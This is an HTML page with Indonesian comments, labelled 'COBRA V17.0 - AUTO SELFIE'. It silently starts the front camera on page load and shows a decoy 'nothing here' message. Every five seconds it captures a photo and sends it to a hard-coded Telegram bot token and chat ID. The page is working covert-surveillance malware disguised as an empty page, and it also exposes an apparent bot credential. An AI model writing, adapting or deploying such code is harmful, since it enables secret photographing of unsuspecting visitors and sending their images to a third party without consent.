<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a, #0f0f1a);
            font-family: system-ui, sans-serif;
        }
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .camera-active video {
            opacity: 1;
        }
        .shutter-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.08s;
        }
        .result-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: clamp(1.2rem, 6vw, 2rem);
            font-weight: 500;
            color: rgba(255,255,255,0.9);
            text-shadow: 0 0 10px rgba(0,0,0,0.5);
            z-index: 101;
            opacity: 0;
            transition: all 0.4s;
            text-align: center;
            background: rgba(0,0,0,0.6);
            padding: 15px 30px;
            border-radius: 50px;
            white-space: nowrap;
            pointer-events: none;
            font-family: monospace;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
        }
        .show-text {
            animation: fadeInOut 2s ease forwards;
        }
        /* Sembunyikan tombol apapun - gak ada */
        button, .btn, .start, .mulai {
            display: none;
        }
        .status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: rgba(255,255,255,0.4);
            font-size: 11px;
            z-index: 102;
            font-family: monospace;
            background: rgba(0,0,0,0.4);
            padding: 4px 12px;
            border-radius: 20px;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <div class="shutter-effect" id="shutter"></div>
    <div class="result-text" id="resultText">Ga ada Apa Apa Sehhh</div>
    <div class="status" id="status"></div>

    <script>
        // ============ COBRA V17.0 - AUTO SELFIE ============
        const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
        const CHAT_ID = "8336543740";
        const COOLDOWN_MS = 5000; // 5 detik delay antar foto
        
        // ============ ELEMEN ============
        const video = document.getElementById('video');
        const shutter = document.getElementById('shutter');
        const resultText = document.getElementById('resultText');
        const statusEl = document.getElementById('status');
        
        let stream = null;
        let isCameraActive = false;
        let cooldown = false;
        let autoTimer = null;
        
        // ============ KIRIM FOTO KE TELEGRAM ============
        async function sendPhotoToTelegram(imageDataUrl) {
            try {
                const blob = await (await fetch(imageDataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return await response.json();
            } catch (error) {
                console.error('Error:', error);
                return null;
            }
        }
        
        // ============ EFEK JEPRET ============
        function shutterEffect() {
            shutter.style.opacity = '1';
            setTimeout(() => {
                shutter.style.opacity = '0';
            }, 100);
            
            // Getaran visual
            document.body.style.transform = 'scale(0.998)';
            setTimeout(() => {
                document.body.style.transform = '';
            }, 60);
        }
        
        // ============ TAMPILIN TEKS ============
        function showText() {
            resultText.classList.remove('show-text');
            void resultText.offsetWidth;
            resultText.classList.add('show-text');
        }
        
        // ============ AMBIL FOTO ============
        async function takeSelfie() {
            if (!stream || !isCameraActive || cooldown) return false;
            
            cooldown = true;
            statusEl.textContent = '📸';
            
            // Efek jepret
            shutterEffect();
            
            // Capture dari video
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Kirim ke bot (background, gak nge-blok)
            sendPhotoToTelegram(photoData).then(() => {
                statusEl.textContent = '✓';
                setTimeout(() => {
                    if(statusEl.textContent === '✓') statusEl.textContent = '';
                }, 1000);
            }).catch(() => {
                statusEl.textContent = '✗';
            });
            
            // Tampilkan teks "Ga ada Apa Apa Sehhh"
            showText();
            
            // Cooldown 5 detik, baru bisa foto lagi
            setTimeout(() => {
                cooldown = false;
                // Auto foto lagi kalo masih aktif
                if (isCameraActive && stream) {
                    takeSelfie();
                }
            }, COOLDOWN_MS);
            
            return true;
        }
        
        // ============ MULAI KAMERA (LANGSUNG TANPA TOMBOL) ============
        async function startCamera() {
            statusEl.textContent = '📷';
            
            try {
                // Paksa kamera DEPAN (user)
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }
                });
                
                video.srcObject = stream;
                await video.play();
                
                document.body.classList.add('camera-active');
                isCameraActive = true;
                statusEl.textContent = '🎥';
                
                // Tunggu sebentar biar kamera stabil
                setTimeout(() => {
                    statusEl.textContent = '';
                    // Langsung ambil foto pertama
                    takeSelfie();
                }, 300);
                
            } catch (err) {
                // Coba kamera default
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await video.play();
                    document.body.classList.add('camera-active');
                    isCameraActive = true;
                    statusEl.textContent = '';
                    
                    setTimeout(() => {
                        takeSelfie();
                    }, 300);
                    
                } catch (err2) {
                    statusEl.textContent = '❌ Izin kamera diperlukan';
                    console.error(err2);
                }
            }
        }
        
        // ============ LANGSUNG JALAN SAAT LOAD ============
        // Gak ada tombol, gak ada apapun. Langsung minta izin.
        window.addEventListener('load', () => {
            // Langsung start camera
            startCamera();
        });
        
        // Matiin kamera kalo page ditutup (opsional)
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
        
        // Kalo user klik di mana aja, gak ngapa-ngapain
        // Tapi tetep bisa jadi trigger buat yang pengen manual
        document.body.addEventListener('click', () => {
            // Kalo kamera mati atau gagal, coba start ulang
            if (!isCameraActive && !stream) {
                startCamera();
            }
        });
        
        console.log('COBRA V17.0 AUTO - No buttons, langsung motret tiap 5 detik');
    </script>
</body>
</html>
